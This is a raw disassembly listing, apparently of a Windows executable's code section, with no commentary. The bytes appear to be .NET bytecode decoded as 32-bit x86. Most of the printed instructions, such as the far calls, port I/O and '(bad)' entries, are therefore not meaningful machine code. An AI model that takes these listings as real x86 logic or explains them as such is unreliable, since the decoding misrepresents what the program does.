  404727:	02 17                	add    (%edi),%dl
  404729:	8d 49 00             	lea    0x0(%ecx),%ecx
  40472c:	00 01                	add    %al,(%ecx)
  40472e:	13 07                	adc    (%edi),%eax
  404730:	11 07                	adc    %eax,(%edi)
  404732:	16                   	push   %ss
  404733:	1f                   	pop    %ds
  404734:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  40473a:	00 00                	add    %al,(%eax)
  40473c:	0a 16                	or     (%esi),%dl
  40473e:	9a 7d 3b 00 00 04 06 	lcall  $0x604,$0x3b7d
  404745:	02 17                	add    (%edi),%dl
  404747:	8d 49 00             	lea    0x0(%ecx),%ecx
  40474a:	00 01                	add    %al,(%ecx)
  40474c:	13 07                	adc    (%edi),%eax
  40474e:	11 07                	adc    %eax,(%edi)
  404750:	16                   	push   %ss
  404751:	1f                   	pop    %ds
  404752:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  404758:	00 00                	add    %al,(%eax)
  40475a:	0a 17                	or     (%edi),%dl
  40475c:	9a 7d 3c 00 00 04 02 	lcall  $0x204,$0x3c7d
  404763:	17                   	pop    %ss
  404764:	8d 49 00             	lea    0x0(%ecx),%ecx
  404767:	00 01                	add    %al,(%ecx)
  404769:	13 07                	adc    (%edi),%eax
  40476b:	11 07                	adc    %eax,(%edi)
  40476d:	16                   	push   %ss
  40476e:	1f                   	pop    %ds
  40476f:	3a 9d 11 07 6f 67    	cmp    0x676f0711(%ebp),%bl
  404775:	00 00                	add    %al,(%eax)
  404777:	0a 18                	or     (%eax),%bl
  404779:	9a 28 d9 00 00 0a 1f 	lcall  $0x1f0a,$0xd928
  404780:	3c d8                	cmp    $0xd8,%al
  404782:	0c 08                	or     $0x8,%al
  404784:	6c                   	insb   (%dx),%es:(%edi)
  404785:	28 dc                	sub    %bl,%ah
  404787:	00 00                	add    %al,(%eax)
  404789:	0a 0d 73 dd 00 00    	or     0xdd73,%cl
  40478f:	0a 0b                	or     (%ebx),%cl
  404791:	07                   	pop    %es
  404792:	6f                   	outsl  %ds:(%esi),(%dx)
  404793:	de 00                	fiadds (%eax)
  404795:	00 0a                	add    %cl,(%edx)
  404797:	2b 34 16             	sub    (%esi,%edx,1),%esi
  40479a:	13 05 06 25 fe 07    	adc    0x7fe2506,%eax
  4047a0:	85 00                	test   %eax,(%eax)
  4047a2:	00 06                	add    %al,(%esi)
  4047a4:	73 46                	jae    0x4047ec
  4047a6:	00 00                	add    %al,(%eax)
  4047a8:	0a 73 47             	or     0x47(%ebx),%dh
  4047ab:	00 00                	add    %al,(%eax)
  4047ad:	0a 13                	or     (%ebx),%dl
  4047af:	04 11                	add    $0x11,%al
  4047b1:	04 6f                	add    $0x6f,%al
  4047b3:	48                   	dec    %eax
  4047b4:	00 00                	add    %al,(%eax)
  4047b6:	0a 11                	or     (%ecx),%dl
  4047b8:	05 17 d6 13 05       	add    $0x513d617,%eax
  4047bd:	11 05 1f 13 31 d9    	adc    %eax,0xd931131f
  4047c3:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  4047c9:	22 00                	and    (%eax),%al
  4047cb:	00 0a                	add    %cl,(%edx)
  4047cd:	09 07                	or     %eax,(%edi)
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	df 00                	filds  (%eax)
  4047d2:	00 0a                	add    %cl,(%edx)
  4047d4:	28 e0                	sub    %ah,%al
  4047d6:	00 00                	add    %al,(%eax)
  4047d8:	0a 2c 07             	or     (%edi,%eax,1),%ch
  4047db:	7e 12                	jle    0x4047ef
  4047dd:	00 00                	add    %al,(%eax)
  4047df:	04 2d                	add    $0x2d,%al
  4047e1:	b7 de                	mov    $0xde,%bh
  4047e3:	0f 25                	(bad)
  4047e5:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4047eb:	06                   	push   %es
  4047ec:	28 27                	sub    %ah,(%edi)
  4047ee:	00 00                	add    %al,(%eax)
  4047f0:	0a de                	or     %dh,%bl
  4047f2:	00 2a                	add    %ch,(%edx)
  4047f4:	01 10                	add    %edx,(%eax)
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	00 00                	add    %al,(%eax)
  4047fa:	00 00                	add    %al,(%eax)
  4047fc:	c4                   	(bad)
  4047fd:	c4 00                	les    (%eax),%eax
  4047ff:	0f 29 00             	movaps %xmm0,(%eax)
  404802:	00 01                	add    %al,(%ecx)
  404804:	13 30                	adc    (%eax),%esi
  404806:	08 00                	or     %al,(%eax)
  404808:	e3 00                	jecxz  0x40480a
  40480a:	00 00                	add    %al,(%eax)
  40480c:	28 00                	sub    %al,(%eax)
  40480e:	00 11                	add    %dl,(%ecx)
  404810:	73 e1                	jae    0x4047f3
  404812:	00 00                	add    %al,(%eax)
  404814:	0a 0c 02             	or     (%edx,%eax,1),%cl
  404817:	72 f1                	jb     0x40480a
  404819:	06                   	push   %es
  40481a:	00 70 15             	add    %dh,0x15(%eax)
  40481d:	16                   	push   %ss
  40481e:	28 af 00 00 0a 13    	sub    %ch,0x130a0000(%edi)
  404824:	05 16 13 04 2b       	add    $0x2b041316,%eax
  404829:	2c 11                	sub    $0x11,%al
  40482b:	05 11 04 9a 0b       	add    $0xb9a0411,%eax
  404830:	08 07                	or     %al,(%edi)
  404832:	14 72                	adc    $0x72,%al
  404834:	75 0b                	jne    0x404841
  404836:	00 70 16             	add    %dh,0x16(%eax)
  404839:	8d 03                	lea    (%ebx),%eax
  40483b:	00 00                	add    %al,(%eax)
  40483d:	01 14 14             	add    %edx,(%esp,%edx,1)
  404840:	14 28                	adc    $0x28,%al
  404842:	41                   	inc    %ecx
  404843:	00 00                	add    %al,(%eax)
  404845:	0a 28                	or     (%eax),%ch
  404847:	23 00                	and    (%eax),%eax
  404849:	00 0a                	add    %cl,(%edx)
  40484b:	6f                   	outsl  %ds:(%esi),(%dx)
  40484c:	e2 00                	loop   0x40484e
  40484e:	00 0a                	add    %cl,(%edx)
  404850:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404853:	d6                   	salc
  404854:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404857:	04 11                	add    $0x11,%al
  404859:	05 8e b7 32 cc       	add    $0xcc32b78e,%eax
  40485e:	1f                   	pop    %ds
  40485f:	1e                   	push   %ds
  404860:	0a 38                	or     (%eax),%bh
  404862:	82 00 00             	addb   $0x0,(%eax)
  404865:	00 28                	add    %ch,(%eax)
  404867:	e3 00                	jecxz  0x404869
  404869:	00 0a                	add    %cl,(%edx)
  40486b:	13 07                	adc    (%edi),%eax
  40486d:	16                   	push   %ss
  40486e:	13 06                	adc    (%esi),%eax
  404870:	2b 60 11             	sub    0x11(%eax),%esp
  404873:	07                   	pop    %es
  404874:	11 06                	adc    %eax,(%esi)
  404876:	9a 0d 09 6f e4 00 00 	lcall  $0x0,$0xe46f090d
  40487d:	0a 28                	or     (%eax),%ch
  40487f:	e5 00                	in     $0x0,%eax
  404881:	00 0a                	add    %cl,(%edx)
  404883:	2c 02                	sub    $0x2,%al
  404885:	2b 45 08             	sub    0x8(%ebp),%eax
  404888:	09 6f e4             	or     %ebp,-0x1c(%edi)
  40488b:	00 00                	add    %al,(%eax)
  40488d:	0a 6f 56             	or     0x56(%edi),%ch
  404890:	00 00                	add    %al,(%eax)
  404892:	0a 25 fe 07 53 00    	or     0x5307fe,%ah
  404898:	00 0a                	add    %cl,(%edx)
  40489a:	73 e6                	jae    0x404882
  40489c:	00 00                	add    %al,(%eax)
  40489e:	0a 28                	or     (%eax),%ch
  4048a0:	03 00                	add    (%eax),%eax
  4048a2:	00 2b                	add    %ch,(%ebx)
  4048a4:	2c 26                	sub    $0x26,%al
  4048a6:	06                   	push   %es
  4048a7:	1f                   	pop    %ds
  4048a8:	1e                   	push   %ds
  4048a9:	31 21                	xor    %esp,(%ecx)
  4048ab:	16                   	push   %ss
  4048ac:	0a 72 85             	or     -0x7b(%edx),%dh
  4048af:	0b 00                	or     (%eax),%eax
  4048b1:	70 09                	jo     0x4048bc
  4048b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b4:	e4 00                	in     $0x0,%al
  4048b6:	00 0a                	add    %cl,(%edx)
  4048b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b9:	56                   	push   %esi
  4048ba:	00 00                	add    %al,(%eax)
  4048bc:	0a 72 93             	or     -0x6d(%edx),%dh
  4048bf:	0b 00                	or     (%eax),%eax
  4048c1:	70 28                	jo     0x4048eb
  4048c3:	28 00                	sub    %al,(%eax)
  4048c5:	00 0a                	add    %cl,(%edx)
  4048c7:	28 39                	sub    %bh,(%ecx)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	11 06                	adc    %eax,(%esi)
  4048ce:	17                   	pop    %ss
  4048cf:	d6                   	salc
  4048d0:	13 06                	adc    (%esi),%eax
  4048d2:	11 06                	adc    %eax,(%esi)
  4048d4:	11 07                	adc    %eax,(%edi)
  4048d6:	8e b7 32 98 06 17    	mov    0x17069832(%edi),%?
  4048dc:	d6                   	salc
  4048dd:	0a 20                	or     (%eax),%ah
  4048df:	e8 03 00 00 28       	call   0x284048e7
  4048e4:	22 00                	and    (%eax),%al
  4048e6:	00 0a                	add    %cl,(%edx)
  4048e8:	7e 12                	jle    0x4048fc
  4048ea:	00 00                	add    %al,(%eax)
  4048ec:	04 3a                	add    $0x3a,%al
  4048ee:	74 ff                	je     0x4048ef
  4048f0:	ff                   	(bad)
  4048f1:	ff 2a                	ljmp   *(%edx)
  4048f3:	00 1b                	add    %bl,(%ebx)
  4048f5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4048f8:	96                   	xchg   %eax,%esi
  4048f9:	00 00                	add    %al,(%eax)
  4048fb:	00 29                	add    %ch,(%ecx)
  4048fd:	00 00                	add    %al,(%eax)
  4048ff:	11 03                	adc    %eax,(%ebx)
  404901:	39 88 00 00 00 17    	cmp    %ecx,0x17000000(%eax)
  404907:	28 b3 00 00 0a 20    	sub    %dh,0x200a0000(%ebx)
  40490d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404910:	00 28                	add    %ch,(%eax)
  404912:	b4 00                	mov    $0x0,%ah
  404914:	00 0a                	add    %cl,(%edx)
  404916:	20 0f                	and    %cl,(%edi)
  404918:	27                   	daa
  404919:	00 00                	add    %al,(%eax)
  40491b:	28 b5 00 00 0a de    	sub    %dh,-0x21f60000(%ebp)
  404921:	0c 28                	or     $0x28,%al
  404923:	25 00 00 0a 28       	and    $0x280a0000,%eax
  404928:	27                   	daa
  404929:	00 00                	add    %al,(%eax)
  40492b:	0a de                	or     %dh,%bl
  40492d:	00 02                	add    %al,(%edx)
  40492f:	28 e8                	sub    %ch,%al
  404931:	00 00                	add    %al,(%eax)
  404933:	0a 74 83 00          	or     0x0(%ebx,%eax,4),%dh
  404937:	00 01                	add    %al,(%ecx)
  404939:	0a 06                	or     (%esi),%al
  40493b:	7e 33                	jle    0x404970
  40493d:	00 00                	add    %al,(%eax)
  40493f:	04 73                	add    $0x73,%al
  404941:	61                   	popa
  404942:	00 00                	add    %al,(%eax)
  404944:	0a 7e 33             	or     0x33(%esi),%bh
  404947:	00 00                	add    %al,(%eax)
  404949:	04 8e                	add    $0x8e,%al
  40494b:	b7 6f                	mov    $0x6f,%bh
  40494d:	68 00 00 0a 9a       	push   $0x9a0a0000
  404952:	6f                   	outsl  %ds:(%esi),(%dx)
  404953:	e9 00 00 0a 06       	jmp    0x64a4958
  404958:	17                   	pop    %ss
  404959:	6f                   	outsl  %ds:(%esi),(%dx)
  40495a:	ea 00 00 0a 06 20 10 	ljmp   $0x1020,$0x60a0000
  404961:	27                   	daa
  404962:	00 00                	add    %al,(%eax)
  404964:	6f                   	outsl  %ds:(%esi),(%dx)
  404965:	eb 00                	jmp    0x404967
  404967:	00 0a                	add    %cl,(%edx)
  404969:	06                   	push   %es
  40496a:	72 97                	jb     0x404903
  40496c:	0b 00                	or     (%eax),%eax
  40496e:	70 6f                	jo     0x4049df
  404970:	ec                   	in     (%dx),%al
  404971:	00 00                	add    %al,(%eax)
  404973:	0a 06                	or     (%esi),%al
  404975:	6f                   	outsl  %ds:(%esi),(%dx)
  404976:	ed                   	in     (%dx),%eax
  404977:	00 00                	add    %al,(%eax)
  404979:	0a 74 84 00          	or     0x0(%esp,%eax,4),%dh
  40497d:	00 01                	add    %al,(%ecx)
  40497f:	0b de                	or     %esi,%ebx
  404981:	0a 07                	or     (%edi),%al
  404983:	2c 06                	sub    $0x6,%al
  404985:	07                   	pop    %es
  404986:	6f                   	outsl  %ds:(%esi),(%dx)
  404987:	5e                   	pop    %esi
  404988:	00 00                	add    %al,(%eax)
  40498a:	0a dc                	or     %ah,%bl
  40498c:	2b 07                	sub    (%edi),%eax
  40498e:	02 28                	add    (%eax),%ch
  404990:	b9 00 00 0a 26       	mov    $0x260a0000,%ecx
  404995:	2a 00                	sub    (%eax),%al
  404997:	00 01                	add    %al,(%ecx)
  404999:	1c 00                	sbb    $0x0,%al
  40499b:	00 00                	add    %al,(%eax)
  40499d:	00 06                	add    %al,(%esi)
  40499f:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  4049a2:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	01 02                	add    %eax,(%edx)
  4049a9:	00 80 00 02 82 00    	add    %al,0x820200(%eax)
  4049af:	0a 00                	or     (%eax),%al
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	00 1b                	add    %bl,(%ebx)
  4049b5:	30 05 00 40 00 00    	xor    %al,0x4000
  4049bb:	00 2a                	add    %ch,(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	11 16                	adc    %edx,(%esi)
  4049c1:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  4049c4:	07                   	pop    %es
  4049c5:	b5 1f                	mov    $0x1f,%ch
  4049c7:	64 28 ee             	fs sub %ch,%dh
  4049ca:	00 00                	add    %al,(%eax)
  4049cc:	0a 13                	or     (%ebx),%dl
  4049ce:	04 12                	add    $0x12,%al
  4049d0:	04 1f                	add    $0x1f,%al
  4049d2:	64 12 02             	adc    %fs:(%edx),%al
  4049d5:	1f                   	pop    %ds
  4049d6:	64 28 3f             	sub    %bh,%fs:(%edi)
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	2c 04                	sub    $0x4,%al
  4049de:	17                   	pop    %ss
  4049df:	0a de                	or     %dh,%bl
  4049e1:	1c 07                	sbb    $0x7,%al
  4049e3:	17                   	pop    %ss
  4049e4:	d6                   	salc
  4049e5:	0b 07                	or     (%edi),%eax
  4049e7:	1a 31                	sbb    (%ecx),%dh
  4049e9:	d8 de                	fcomp  %st(6)
  4049eb:	0e                   	push   %cs
  4049ec:	25 28 25 00 00       	and    $0x2528,%eax
  4049f1:	0a 0d 28 27 00 00    	or     0x2728,%cl
  4049f7:	0a de                	or     %dh,%bl
  4049f9:	00 16                	add    %dl,(%esi)
  4049fb:	0a 2b                	or     (%ebx),%ch
  4049fd:	00 06                	add    %al,(%esi)
  4049ff:	2a 01                	sub    (%ecx),%al
  404a01:	10 00                	adc    %al,(%eax)
  404a03:	00 00                	add    %al,(%eax)
  404a05:	00 00                	add    %al,(%eax)
  404a07:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  404a0a:	00 0e                	add    %cl,(%esi)
  404a0c:	29 00                	sub    %eax,(%eax)
  404a0e:	00 01                	add    %al,(%ecx)
  404a10:	13 30                	adc    (%eax),%esi
  404a12:	09 00                	or     %eax,(%eax)
  404a14:	c8 00 00 00          	enter  $0x0,$0x0
  404a18:	2b 00                	sub    (%eax),%eax
  404a1a:	00 11                	add    %dl,(%ecx)
  404a1c:	28 b6 00 00 0a 1c    	sub    %dh,0x1c0a0000(%esi)
  404a22:	28 67 00             	sub    %ah,0x0(%edi)
  404a25:	00 06                	add    %al,(%esi)
  404a27:	02 28                	add    (%eax),%ch
  404a29:	1f                   	pop    %ds
  404a2a:	00 00                	add    %al,(%eax)
  404a2c:	0a 28                	or     (%eax),%ch
  404a2e:	b7 00                	mov    $0x0,%bh
  404a30:	00 0a                	add    %cl,(%edx)
  404a32:	0a 06                	or     (%esi),%al
  404a34:	28 23                	sub    %ah,(%ebx)
  404a36:	00 00                	add    %al,(%eax)
  404a38:	0a 03                	or     (%ebx),%al
  404a3a:	28 31                	sub    %dh,(%ecx)
  404a3c:	00 00                	add    %al,(%eax)
  404a3e:	0a 20                	or     (%eax),%ah
  404a40:	f4                   	hlt
  404a41:	01 00                	add    %eax,(%eax)
  404a43:	00 28                	add    %ch,(%eax)
  404a45:	22 00                	and    (%eax),%al
  404a47:	00 0a                	add    %cl,(%edx)
  404a49:	02 6f 56             	add    0x56(%edi),%ch
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	0a 72 9f             	or     -0x61(%edx),%dh
  404a51:	0b 00                	or     (%eax),%eax
  404a53:	70 6f                	jo     0x404ac4
  404a55:	ef                   	out    %eax,(%dx)
  404a56:	00 00                	add    %al,(%eax)
  404a58:	0a 2c 3b             	or     (%ebx,%edi,1),%ch
  404a5b:	72 7f                	jb     0x404adc
  404a5d:	03 00                	add    (%eax),%eax
  404a5f:	70 73                	jo     0x404ad4
  404a61:	32 00                	xor    (%eax),%al
  404a63:	00 0a                	add    %cl,(%edx)
  404a65:	0c 08                	or     $0x8,%al
  404a67:	17                   	pop    %ss
  404a68:	6f                   	outsl  %ds:(%esi),(%dx)
  404a69:	33 00                	xor    (%eax),%eax
  404a6b:	00 0a                	add    %cl,(%edx)
  404a6d:	08 72 a9             	or     %dh,-0x57(%edx)
  404a70:	0b 00                	or     (%eax),%eax
  404a72:	70 06                	jo     0x404a7a
  404a74:	28 91 00 00 0a 72    	sub    %dl,0x720a0000(%ecx)
  404a7a:	53                   	push   %ebx
  404a7b:	02 00                	add    (%eax),%al
  404a7d:	70 28                	jo     0x404aa7
  404a7f:	91                   	xchg   %eax,%ecx
  404a80:	00 00                	add    %al,(%eax)
  404a82:	0a 28                	or     (%eax),%ch
  404a84:	23 00                	and    (%eax),%eax
  404a86:	00 0a                	add    %cl,(%edx)
  404a88:	6f                   	outsl  %ds:(%esi),(%dx)
  404a89:	37                   	aaa
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 08                	or     (%eax),%cl
  404a8e:	28 38                	sub    %bh,(%eax)
  404a90:	00 00                	add    %al,(%eax)
  404a92:	0a 0b                	or     (%ebx),%cl
  404a94:	2b 4d 14             	sub    0x14(%ebp),%ecx
  404a97:	d0 2b                	shrb   $1,(%ebx)
  404a99:	00 00                	add    %al,(%eax)
  404a9b:	01 28                	add    %ebp,(%eax)
  404a9d:	14 00                	adc    $0x0,%al
  404a9f:	00 0a                	add    %cl,(%edx)
  404aa1:	72 c3                	jb     0x404a66
  404aa3:	07                   	pop    %es
  404aa4:	00 70 17             	add    %dh,0x17(%eax)
  404aa7:	8d 03                	lea    (%ebx),%eax
  404aa9:	00 00                	add    %al,(%eax)
  404aab:	01 0d 09 16 06 28    	add    %ecx,0x28061609
  404ab1:	11 00                	adc    %eax,(%eax)
  404ab3:	00 0a                	add    %cl,(%edx)
  404ab5:	a2 09 13 04 11       	mov    %al,0x11041309
  404aba:	04 14                	add    $0x14,%al
  404abc:	14 17                	adc    $0x17,%al
  404abe:	8d 38                	lea    (%eax),%edi
  404ac0:	00 00                	add    %al,(%eax)
  404ac2:	01 13                	add    %edx,(%ebx)
  404ac4:	05 11 05 16 17       	add    $0x17160511,%eax
  404ac9:	9c                   	pushf
  404aca:	11 05 17 28 44 00    	adc    %eax,0x442817
  404ad0:	00 0a                	add    %cl,(%edx)
  404ad2:	26 11 05 16 90 2c 0a 	adc    %eax,%es:0xa2c9016
  404ad9:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404adc:	9a 28 11 00 00 0a 0a 	lcall  $0xa0a,$0x1128
  404ae3:	2a 1b                	sub    (%ebx),%bl
  404ae5:	30 03                	xor    %al,(%ebx)
  404ae7:	00 5d 00             	add    %bl,0x0(%ebp)
  404aea:	00 00                	add    %al,(%eax)
  404aec:	2c 00                	sub    $0x0,%al
  404aee:	00 11                	add    %dl,(%ecx)
  404af0:	28 d3                	sub    %dl,%bl
  404af2:	00 00                	add    %al,(%eax)
  404af4:	0a 02                	or     (%edx),%al
  404af6:	6f                   	outsl  %ds:(%esi),(%dx)
  404af7:	d4 00                	aam    $0x0
  404af9:	00 0a                	add    %cl,(%edx)
  404afb:	0b 07                	or     (%edi),%eax
  404afd:	6f                   	outsl  %ds:(%esi),(%dx)
  404afe:	f0 00 00             	lock add %al,(%eax)
  404b01:	0a 0d 07 09 6f d6    	or     0xd66f0907,%cl
  404b07:	00 00                	add    %al,(%eax)
  404b09:	0a 6f f1             	or     -0xf(%edi),%ch
  404b0c:	00 00                	add    %al,(%eax)
  404b0e:	0a 28                	or     (%eax),%ch
  404b10:	11 00                	adc    %eax,(%eax)
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	0c 17                	or     $0x17,%al
  404b16:	8d 03                	lea    (%ebx),%eax
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	01 13                	add    %edx,(%ebx)
  404b1c:	04 09                	add    $0x9,%al
  404b1e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b1f:	f2 00 00             	repnz add %al,(%eax)
  404b22:	0a 8e b7 16 33 03    	or     0x33316b7(%esi),%cl
  404b28:	14 13                	adc    $0x13,%al
  404b2a:	04 09                	add    $0x9,%al
  404b2c:	08 28                	or     %ch,(%eax)
  404b2e:	11 00                	adc    %eax,(%eax)
  404b30:	00 0a                	add    %cl,(%edx)
  404b32:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404b35:	f3 00 00             	repz add %al,(%eax)
  404b38:	0a 26                	or     (%esi),%ah
  404b3a:	de 0f                	fimuls (%edi)
  404b3c:	25 28 25 00 00       	and    $0x2528,%eax
  404b41:	0a 13                	or     (%ebx),%dl
  404b43:	05 28 27 00 00       	add    $0x2728,%eax
  404b48:	0a de                	or     %dh,%bl
  404b4a:	00 06                	add    %al,(%esi)
  404b4c:	2a 00                	sub    (%eax),%al
  404b4e:	00 00                	add    %al,(%eax)
  404b50:	01 10                	add    %edx,(%eax)
  404b52:	00 00                	add    %al,(%eax)
  404b54:	00 00                	add    %al,(%eax)
  404b56:	00 00                	add    %al,(%eax)
  404b58:	4c                   	dec    %esp
  404b59:	4c                   	dec    %esp
  404b5a:	00 0f                	add    %cl,(%edi)
  404b5c:	29 00                	sub    %eax,(%eax)
  404b5e:	00 01                	add    %al,(%ecx)
  404b60:	3a 02                	cmp    (%edx),%al
  404b62:	28 23                	sub    %ah,(%ebx)
  404b64:	00 00                	add    %al,(%eax)
  404b66:	0a 28                	or     (%eax),%ch
  404b68:	3b 00                	cmp    (%eax),%eax
  404b6a:	00 06                	add    %al,(%esi)
  404b6c:	2b 00                	sub    (%eax),%eax
  404b6e:	2a 00                	sub    (%eax),%al
  404b70:	3a 02                	cmp    (%edx),%al
  404b72:	28 23                	sub    %ah,(%ebx)
  404b74:	00 00                	add    %al,(%eax)
  404b76:	0a 28                	or     (%eax),%ch
  404b78:	3c 00                	cmp    $0x0,%al
  404b7a:	00 06                	add    %al,(%esi)
  404b7c:	2b 00                	sub    (%eax),%eax
  404b7e:	2a 00                	sub    (%eax),%al
  404b80:	1b 30                	sbb    (%eax),%esi
  404b82:	05 00 aa 00 00       	add    $0xaa00,%eax
  404b87:	00 2d 00 00 11 18    	add    %ch,0x18110000
  404b8d:	17                   	pop    %ss
  404b8e:	1c 73                	sbb    $0x73,%al
  404b90:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b93:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404b96:	02 7b 3b             	add    0x3b(%ebx),%bh
  404b99:	00 00                	add    %al,(%eax)
  404b9b:	04 02                	add    $0x2,%al
  404b9d:	7b 3c                	jnp    0x404bdb
  404b9f:	00 00                	add    %al,(%eax)
  404ba1:	04 28                	add    $0x28,%al
  404ba3:	d9 00                	flds   (%eax)
  404ba5:	00 0a                	add    %cl,(%edx)
  404ba7:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	00 00                	add    %al,(%eax)
  404bab:	0a 1b                	or     (%ebx),%bl
  404bad:	8d 26                	lea    (%esi),%esp
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	01 13                	add    %edx,(%ebx)
  404bb3:	04 11                	add    $0x11,%al
  404bb5:	04 16                	add    $0x16,%al
  404bb7:	72 e9                	jb     0x404ba2
  404bb9:	0b 00                	or     (%eax),%eax
  404bbb:	70 a2                	jo     0x404b5f
  404bbd:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404bc0:	02 7b 3b             	add    0x3b(%ebx),%bh
  404bc3:	00 00                	add    %al,(%eax)
  404bc5:	04 a2                	add    $0xa2,%al
  404bc7:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  404bca:	72 19                	jb     0x404be5
  404bcc:	0c 00                	or     $0x0,%al
  404bce:	70 a2                	jo     0x404b72
  404bd0:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  404bd3:	7e 33                	jle    0x404c08
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	04 73                	add    $0x73,%al
  404bd9:	61                   	popa
  404bda:	00 00                	add    %al,(%eax)
  404bdc:	0a 7e 33             	or     0x33(%esi),%bh
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	04 8e                	add    $0x8e,%al
  404be3:	b7 6f                	mov    $0x6f,%bh
  404be5:	68 00 00 0a 9a       	push   $0x9a0a0000
  404bea:	a2 11 04 1a 72       	mov    %al,0x721a0411
  404bef:	ca 0c 00             	lret   $0xc
  404bf2:	70 a2                	jo     0x404b96
  404bf4:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404bf7:	36 00 00             	add    %al,%ss:(%eax)
  404bfa:	0a 0b                	or     (%ebx),%cl
  404bfc:	28 f4                	sub    %dh,%ah
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 07                	or     (%edi),%al
  404c02:	6f                   	outsl  %ds:(%esi),(%dx)
  404c03:	f5                   	cmc
  404c04:	00 00                	add    %al,(%eax)
  404c06:	0a 0a                	or     (%edx),%cl
  404c08:	08 06                	or     %al,(%esi)
  404c0a:	16                   	push   %ss
  404c0b:	06                   	push   %es
  404c0c:	8e b7 16 6f f6 00    	mov    0xf66f16(%edi),%?
  404c12:	00 0a                	add    %cl,(%edx)
  404c14:	26 20 c4             	es and %al,%ah
  404c17:	09 00                	or     %eax,(%eax)
  404c19:	00 28                	add    %ch,(%eax)
  404c1b:	22 00                	and    (%eax),%al
  404c1d:	00 0a                	add    %cl,(%edx)
  404c1f:	08 6f ad             	or     %ch,-0x53(%edi)
  404c22:	00 00                	add    %al,(%eax)
  404c24:	0a de                	or     %dh,%bl
  404c26:	0e                   	push   %cs
  404c27:	25 28 25 00 00       	and    $0x2528,%eax
  404c2c:	0a 0d 28 27 00 00    	or     0x2728,%cl
  404c32:	0a de                	or     %dh,%bl
  404c34:	00 2a                	add    %ch,(%edx)
  404c36:	00 00                	add    %al,(%eax)
  404c38:	01 10                	add    %edx,(%eax)
  404c3a:	00 00                	add    %al,(%eax)
  404c3c:	00 00                	add    %al,(%eax)
  404c3e:	00 00                	add    %al,(%eax)
  404c40:	9b                   	fwait
  404c41:	9b                   	fwait
  404c42:	00 0e                	add    %cl,(%esi)
  404c44:	29 00                	sub    %eax,(%eax)
  404c46:	00 01                	add    %al,(%ecx)
  404c48:	1e                   	push   %ds
  404c49:	02 28                	add    (%eax),%ch
  404c4b:	17                   	pop    %ss
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	0a 2a                	or     (%edx),%ch
  404c50:	1e                   	push   %ds
  404c51:	02 28                	add    (%eax),%ch
  404c53:	17                   	pop    %ss
  404c54:	00 00                	add    %al,(%eax)
  404c56:	0a 2a                	or     (%edx),%ch
  404c58:	1b 30                	sbb    (%eax),%esi
  404c5a:	04 00                	add    $0x0,%al
  404c5c:	32 03                	xor    (%ebx),%al
  404c5e:	00 00                	add    %al,(%eax)
  404c60:	2e 00 00             	add    %al,%cs:(%eax)
  404c63:	11 02                	adc    %eax,(%edx)
  404c65:	2c 2f                	sub    $0x2f,%al
  404c67:	28 b6 00 00 0a 1c    	sub    %dh,0x1c0a0000(%esi)
  404c6d:	28 67 00             	sub    %ah,0x0(%edi)
  404c70:	00 06                	add    %al,(%esi)
  404c72:	03 28                	add    (%eax),%ebp
  404c74:	1f                   	pop    %ds
  404c75:	00 00                	add    %al,(%eax)
  404c77:	0a 28                	or     (%eax),%ch
  404c79:	b7 00                	mov    $0x0,%bh
  404c7b:	00 0a                	add    %cl,(%edx)
  404c7d:	10 01                	adc    %al,(%ecx)
  404c7f:	03 04 28             	add    (%eax,%ebp,1),%eax
  404c82:	31 00                	xor    %eax,(%eax)
  404c84:	00 0a                	add    %cl,(%edx)
  404c86:	de 0e                	fimuls (%esi)
  404c88:	25 28 25 00 00       	and    $0x2528,%eax
  404c8d:	0a 0a                	or     (%edx),%cl
  404c8f:	28 27                	sub    %ah,(%edi)
  404c91:	00 00                	add    %al,(%eax)
  404c93:	0a de                	or     %dh,%bl
  404c95:	00 7e 0e             	add    %bh,0xe(%esi)
  404c98:	00 00                	add    %al,(%eax)
  404c9a:	04 72                	add    $0x72,%al
  404c9c:	c9                   	leave
  404c9d:	01 00                	add    %eax,(%eax)
  404c9f:	70 7e                	jo     0x404d1f
  404ca1:	0f 00 00             	sldt   (%eax)
  404ca4:	04 28                	add    $0x28,%al
  404ca6:	28 00                	sub    %al,(%eax)
